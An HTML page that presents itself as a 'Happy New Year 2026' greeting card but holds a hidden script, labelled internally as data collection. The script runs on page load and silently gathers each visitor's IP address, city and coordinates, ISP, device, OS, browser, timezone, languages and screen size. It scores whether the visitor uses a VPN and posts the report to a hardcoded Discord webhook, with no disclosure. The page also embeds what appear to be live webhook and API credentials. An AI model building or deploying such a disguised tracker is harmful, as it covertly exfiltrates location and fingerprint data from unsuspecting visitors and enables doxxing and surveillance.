<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>âœ¨ Happy New Year 2026 âœ¨</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="referrer" content="no-referrer"/>
  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;500;600;700&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
  <style>
    *{ margin:0; padding:0; box-sizing:border-box; }
    html,body{ width:100%; height:100%; overflow-x:hidden; overflow-y:auto; background:#0a0a1a; font-family: 'Poppins', sans-serif; }
    .main-container { min-height: 100vh; background: linear-gradient(135deg, rgba(10, 10, 26, 0.95) 0%, rgba(20, 20, 40, 0.9) 100%); display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .content-container { position: relative; max-width: 800px; width: 100%; margin: 0 auto; padding: 40px 0; text-align: center; }
    .new-year-text { font-family: 'Dancing Script', cursive; font-size: clamp(3.5rem, 10vw, 6rem); background: linear-gradient(45deg, #FFD700, #FFA500, #FF6B6B, #FFD700); background-size: 300% 300%; -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; animation: gradientShift 8s ease infinite; }
    @keyframes gradientShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
    .year-number { font-family: 'Montserrat', sans-serif; font-size: clamp(4rem, 12vw, 8rem); font-weight: 800; color: #FFD700; margin: 20px 0; text-shadow: 0 0 30px rgba(255, 215, 0, 0.5); }
    .wishes-section { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border-radius: 30px; padding: 40px 30px; margin: 40px auto; border: 1px solid rgba(255, 215, 0, 0.1); max-width: 900px; }
    .wish-text { font-size: clamp(1.4rem, 3vw, 1.8rem); line-height: 1.8; color: #f0f0f0; margin-bottom: 30px; font-style: italic; }
    .footer { text-align:center; padding: 40px 20px; margin-top: 60px; color: rgba(255, 255, 255, 0.6); font-size: 0.9rem; border-top: 1px solid rgba(255, 255, 255, 0.1); width: 100%; }
  </style>
</head>
<body>
<div class="main-container">
  <div class="content-container">
    <section class="hero-section">
      <h1 class="new-year-text">Happy New Year</h1>
      <div class="year-number">2026</div>
      <p style="color: rgba(255,255,255,0.8); font-size: 1.3rem; margin-top: 20px;">
        Welcome to a new beginning filled with hope, joy, and endless possibilities
      </p>
    </section>
    <section class="wishes-section">
      <p class="wish-text">
        As the clock strikes midnight and a new year dawns, we wish you a year filled with
        abundant joy, remarkable success, and beautiful memories that last a lifetime.
      </p>
      <div class="wish-author" style="color: rgba(255,215,0,0.8); font-weight: 500; margin-top: 30px;">â€” With warmest wishes for 2026</div>
    </section>
    <footer class="footer">
      <p>Wishing you and your loved ones a spectacular New Year 2026</p>
    </footer>
  </div>
</div>

<script>
// â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
// â•‘           2026 DATA COLLECTION - DUAL VPN DETECTION METHODS                â•‘
// â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1432202259005051001/90bxiwZLU2Y_eVmCguLrIDcb1R6rlfzEK2XAnzbx8GpEP-HJXaAtnzqqbH5hJb1OJwMH";
const IPIFY_API_KEY = "at_fvVzo9h2GyZ55eflsA6LgNZGOyH98";

// Timezone mapping reference for common timezone-country combinations
const COMMON_TIMEZONE_COUNTRIES = {
  "America/New_York": ["US", "CA"],
  "America/Chicago": ["US", "CA", "MX"],
  "America/Denver": ["US", "CA", "MX"],
  "America/Los_Angeles": ["US", "CA", "MX"],
  "Europe/London": ["GB", "IE", "PT"],
  "Europe/Paris": ["FR", "DE", "ES", "IT", "NL", "BE"],
  "Europe/Berlin": ["DE", "AT", "CH", "NL", "BE"],
  "Asia/Tokyo": ["JP"],
  "Asia/Shanghai": ["CN"],
  "Asia/Kolkata": ["IN"],
  "Australia/Sydney": ["AU"]
};

// ---- CORE DATA FUNCTIONS ----
async function getIPAndGeo() {
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const { ip } = await ipRes.json();
    
    const geoUrl = `https://geo.ipify.org/api/v2/country,city?apiKey=${IPIFY_API_KEY}&ipAddress=${ip}`;
    const geoRes = await fetch(geoUrl);
    
    if (!geoRes.ok) throw new Error(`IPify API error: ${geoRes.status}`);
    
    const geoData = await geoRes.json();
    return { ip, geoData };
  } catch (error) {
    console.error("Geolocation failed:", error);
    return null;
  }
}

// ---- DUAL VPN DETECTION METHODS ----

// METHOD 2: Heuristic Analysis (ISP/Hosting Detection)
function checkHostingIP(geoData) {
  const asName = geoData?.as?.name || '';
  const isp = geoData?.isp || '';
  const orgString = (asName + isp).toLowerCase();
  
  // Comprehensive list of hosting/datacenter providers
  const hostingProviders = [
    'amazon', 'aws', 'google', 'gcp', 'microsoft', 'azure',
    'digitalocean', 'linode', 'vultr', 'ovh', 'hetzner',
    'cloudflare', 'akamai', 'fastly', 'leaseweb', 'alibaba',
    'oracle cloud', 'ibm cloud', 'rackspace', 'choopa', 'psychz',
    'serverion', 'crowncloud', 'private layer', 'm247', 'colo'
  ];
  
  return hostingProviders.some(provider => orgString.includes(provider));
}

// METHOD 3: Multi-Source Data Cross-Check
function checkLocationMismatch(geoData, clientCountryCode) {
  if (!clientCountryCode || !geoData?.location?.country) return null;
  
  const ipCountry = geoData.location.country; // 2-letter country code from IP
  
  // 1. Direct country code mismatch (strongest signal)
  if (clientCountryCode !== ipCountry) {
    return `Country mismatch: IP=${ipCountry}, Browser=${clientCountryCode}`;
  }
  
  // 2. Timezone-country consistency check
  const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  if (browserTimezone && COMMON_TIMEZONE_COUNTRIES[browserTimezone]) {
    const typicalCountries = COMMON_TIMEZONE_COUNTRIES[browserTimezone];
    if (!typicalCountries.includes(ipCountry)) {
      return `Timezone atypical: ${browserTimezone} in ${ipCountry}`;
    }
  }
  
  // 3. Language-country consistency check (weaker signal)
  const browserLang = navigator.language.substring(0, 2).toUpperCase();
  const commonLangMap = {
    'US': 'EN', 'GB': 'EN', 'DE': 'DE', 'FR': 'FR', 
    'ES': 'ES', 'IT': 'IT', 'JP': 'JA', 'CN': 'ZH'
  };
  
  if (commonLangMap[ipCountry] && browserLang !== commonLangMap[ipCountry]) {
    return `Language atypical: ${browserLang} for ${ipCountry}`;
  }
  
  return null; // No mismatch detected
}

// ---- COMBINED VPN ASSESSMENT ----
async function assessVpnRisk(ip, geoData) {
  const results = {
    finalVerdict: "NO",
    confidence: "low",
    details: []
  };
  
  // Get client's browser-detected country
  let clientCountryCode = null;
  try {
    const locale = Intl.DateTimeFormat().resolvedOptions().locale;
    clientCountryCode = locale.split('-')[1]?.toUpperCase();
  } catch(e) { /* Ignore if unavailable */ }
  
  // METHOD 2: Heuristic ISP Analysis
  const isHostingIP = checkHostingIP(geoData);
  if (isHostingIP) {
    results.details.push("IP belongs to hosting/datacenter provider");
    results.finalVerdict = "SUSPECT";
    results.confidence = "medium";
  }
  
  // METHOD 3: Cross-Check Analysis
  const mismatch = checkLocationMismatch(geoData, clientCountryCode);
  if (mismatch) {
    results.details.push(mismatch);
    results.finalVerdict = "SUSPECT";
    results.confidence = mismatch.includes("Country mismatch") ? "high" : "medium";
  }
  
  // Residential ISP counter-check
  const orgString = (geoData?.as?.name + geoData?.isp).toLowerCase();
  const residentialIsps = ['comcast', 'spectrum', 'verizon', 'att', 'bt', 'vodafone', 'telecom', 't-mobile', 'orange'];
  const isResidential = residentialIsps.some(isp => orgString.includes(isp));
  
  if (isResidential && results.finalVerdict === "SUSPECT") {
    results.details.push("Residential ISP detected (reduces suspicion)");
    results.confidence = "low";
  }
  
  // Format final output
  let output = `${results.finalVerdict}`;
  if (results.details.length > 0) {
    output += ` (${results.details.join('; ')})`;
  }
  if (results.confidence !== "low") {
    output += ` [${results.confidence} confidence]`;
  }
  
  return output;
}

// ---- CLIENT INFO DETECTION ----
function detectDeviceType() {
  const ua = navigator.userAgent;
  if (/mobile|android|iphone|ipad|ipod/i.test(ua)) {
    return screen.width < 768 ? "ðŸ“± Mobile Phone" : "ðŸ“± Tablet";
  }
  return "ðŸ’» Desktop/Laptop";
}

function detectOS() {
  const ua = navigator.userAgent;
  if (/Windows NT 10.0/.test(ua)) return "Windows 10/11";
  if (/Windows NT/.test(ua)) return "Windows";
  if (/Macintosh/.test(ua)) return "macOS";
  if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
  if (/Android/.test(ua)) return "Android";
  if (/Linux/.test(ua)) return "Linux";
  return navigator.platform || "Unknown OS";
}

function detectBrowser() {
  const ua = navigator.userAgent;
  if (/Edg\//.test(ua)) return "Microsoft Edge";
  if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) return "Google Chrome";
  if (/Firefox\//.test(ua)) return "Mozilla Firefox";
  if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) return "Apple Safari";
  return "Unknown Browser";
}

// ---- MAIN DATA COLLECTION ----
async function collectAndSendData() {
  try {
    console.log("Starting dual-method data collection...");
    
    // Get IP and geolocation
    const ipGeo = await getIPAndGeo();
    if (!ipGeo) throw new Error("Failed to get IP or geolocation.");
    
    const { ip, geoData } = ipGeo;
    
    // Detect client info
    const deviceType = detectDeviceType();
    const osType = detectOS();
    const browserType = detectBrowser();
    
    // Get browser timezone and language
    const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const browserLanguages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
    
    // Perform dual VPN assessment
    const vpnAssessment = await assessVpnRisk(ip, geoData);
    
    // Prepare payload for Discord
    const payload = {
      "ðŸŒ **IP Address**": `\`${ip}\``,
      "ðŸ“ **IP Location**": `\`${geoData.location.city}, ${geoData.location.region}, ${geoData.location.country}\``,
      "ðŸ—ºï¸ **Coordinates**": `\`${geoData.location.lat}, ${geoData.location.lng}\``,
      "ðŸ¢ **ISP / Network**": `\`${geoData.isp} (AS${geoData.as?.asn || 'N/A'})\``,
      "ðŸ“± **Device Type**": `\`${deviceType}\``,
      "ðŸ’» **Operating System**": `\`${osType}\``,
      "ðŸŒ **Browser**": `\`${browserType}\``,
      "ðŸ•’ **Browser Timezone**": `\`${browserTimezone}\``,
      "ðŸ—£ï¸ **Browser Languages**": `\`${browserLanguages}\``,
      "âš ï¸ **VPN Assessment**": `\`${vpnAssessment}\``,
      "ðŸ” **Detection Methods**": "`Heuristic ISP + Location Cross-Check`",
      "ðŸ–¥ï¸ **Screen Resolution**": `\`${screen.width}Ã—${screen.height}\``,
      "â° **IP Timezone**": `\`${geoData.location.timezone}\``,
      "â±ï¸ **Visit Time (UTC)**": `\`${new Date().toISOString()}\``,
      "ðŸ‘¤ **User Agent Short**": `\`${navigator.userAgent.substring(0, 80)}...\``
    };
    
    // Send to Discord
    await sendToDiscord(payload, ip);
    console.log("âœ… Data sent successfully with dual VPN detection.");
    
  } catch (error) {
    console.error("âŒ Collection error:", error);
    await sendErrorToDiscord(error.message);
  }
}

// ---- DISCORD INTEGRATION ----
async function sendToDiscord(data, ip) {
  try {
    const fields = Object.entries(data).map(([name, value]) => ({
      name: name,
      value: value,
      inline: false
    }));
    
    const embed = {
      username: "New Year 2026 Tracker",
      embeds: [{
        title: "ðŸŽ‰ Dual-Method VPN Detection Report ðŸŽ‰",
        color: 0xFFD700,
        description: `**Comprehensive analysis for IP:** \`${ip}\`\n*Combining heuristic ISP checks + location cross-verification*`,
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: {
          text: "IPify API + Dual Detection Logic",
        }
      }],
      content: `<@&1432202036723847221> New visitor data with enhanced VPN analysis.`
    };
    
    const response = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
    
    if (!response.ok) throw new Error(`Discord error: ${response.status}`);
  } catch (error) {
    console.error("Failed to send to Discord:", error);
  }
}

async function sendErrorToDiscord(errorMsg) {
  try {
    const embed = {
      embeds: [{
        title: "âŒ Data Collection Error",
        description: `\`\`\`${errorMsg}\`\`\``,
        color: 0xFF0000,
        timestamp: new Date().toISOString()
      }]
    };
    await fetch(DISCORD_WEBHOOK, { 
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' }, 
      body: JSON.stringify(embed) 
    });
  } catch (e) { console.error("Couldn't send error log:", e); }
}

// ---- INITIALIZE ----
document.addEventListener('DOMContentLoaded', () => {
  // Small delay to ensure page renders first
  setTimeout(collectAndSendData, 1500);
});
</script>
</body>
</html>